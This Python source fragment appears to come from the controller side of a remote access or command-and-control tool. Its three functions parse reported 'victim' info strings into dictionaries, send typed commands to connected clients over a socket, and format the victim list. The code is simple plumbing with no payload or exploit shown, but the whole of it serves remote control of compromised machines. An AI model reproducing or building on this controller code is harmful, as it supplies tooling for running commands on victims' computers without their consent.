def gatherInfoOutput(data):
    try:
        output_dict = {}
        items = data.split("|")  # Split the data into a list of items
        for item in items:  # Iterate over the items
            # Split each item into key and remaining parts
            key, *value_parts = item.split(":")
            # Join the remaining parts back into a single value
            value = ":".join(value_parts)
            value = value.replace("colon", ":")  # Replace "colon" with ":"
            # Add the key-value pair to the dictionary
            output_dict[key] = value
        return output_dict
    except Exception as e:
        print(f"Error gathering info output: {str(e)}")
        return "Error gathering info output"


def executeCommands(command_type, command, client_socket):
    """Send a command to the client using client_socket"""
    try:
        rounded = "command_type:" + command_type + "|command:" + command

        client_socket.send(rounded.encode())
    except Exception as e:
        output = str(e)
        print(f"Error executing command: {output}")
        return output


def getBetterVictimsList(victims):
    """Get a better formatted list of victims"""
    betterVictimsList = []

    for victim in victims:
        victim_dict = gatherInfoOutput(victim)

        betterVictimsList.append(victim_dict)

    return betterVictimsList
